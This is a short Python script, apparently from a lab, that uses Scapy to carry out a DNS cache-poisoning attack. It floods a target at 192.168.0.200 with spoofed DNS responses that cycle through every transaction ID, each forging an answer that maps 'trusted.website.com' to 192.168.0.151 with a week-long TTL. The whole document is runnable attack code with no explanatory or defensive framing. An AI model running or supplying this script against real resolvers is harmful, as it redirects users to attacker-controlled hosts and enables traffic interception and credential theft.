from scapy.all import *

src_ip="192.168.0.100"
dst_ip="192.168.0.200"

src_port=53
dst_port=6666

def attack():
	for i in range (1,65536):
		send(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=i, qr=1, aa=1, qd=1, an=DNSRR(rrname='trusted.website.com', ttl=604769, rdata="192.168.0.151")))
	print("Done")


if __name__ == "__main__":
	attack()
